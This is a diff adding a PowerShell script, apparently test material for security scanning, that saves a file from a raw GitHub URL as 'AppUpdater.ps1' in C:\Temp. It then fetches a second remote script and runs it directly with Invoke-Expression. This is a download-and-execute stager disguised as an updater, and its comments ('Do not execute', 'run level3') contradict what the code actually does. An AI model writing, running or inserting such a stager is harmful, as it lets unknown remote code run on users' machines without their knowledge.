@@ -1,0 +1,32 @@
+param(
+    [string]$SourceUrl = "https://raw.githubusercontent.com/testingindustriallogic/securityscanning/main/level3",
+    [string]$LocalScriptPath = "C:\Temp\AppUpdaterTemp\AppUpdater.ps1",
+    [string]$TriggerUrl = "https://raw.githubusercontent.com/testingindustriallogic/securityscanning/main/level2"
+)
+Set-StrictMode -Version Latest
+$ErrorActionPreference = "Stop"
+$targetDir = Split-Path -Path $LocalScriptPath -Parent
+if (-not (Test-Path -LiteralPath $targetDir)) {
+    New-Item -Path $targetDir -ItemType Directory -Force | Out-Null
+}
+$tmpPath = "$LocalScriptPath.tmp"
+# Download to a temp file first to avoid corrupting the last known-good script.
+Invoke-WebRequest -Uri $SourceUrl -UseBasicParsing -OutFile $tmpPath
+if (-not (Test-Path -LiteralPath $tmpPath)) {
+    throw "Download failed: temporary file was not created at $tmpPath"
+}
+$tmpFileInfo = Get-Item -LiteralPath $tmpPath
+if ($tmpFileInfo.Length -le 0) {
+    throw "Download failed: temporary file is empty at $tmpPath"
+}
+Move-Item -Path $tmpPath -Destination $LocalScriptPath -Force
+if (-not (Test-Path -LiteralPath $LocalScriptPath)) {
+    throw "Write failed: target file was not created at $LocalScriptPath"
+}
+# Confirm write completion by opening the file for reading.
+$fileStream = [System.IO.File]::Open($LocalScriptPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read)
+$fileStream.Dispose()
+# Download and write only. Do not execute the created local script file.
+# Then pull and run level3 as the trigger step.
+$triggerScript = Invoke-RestMethod -Uri $TriggerUrl -UseBasicParsing
+Invoke-Expression $triggerScript
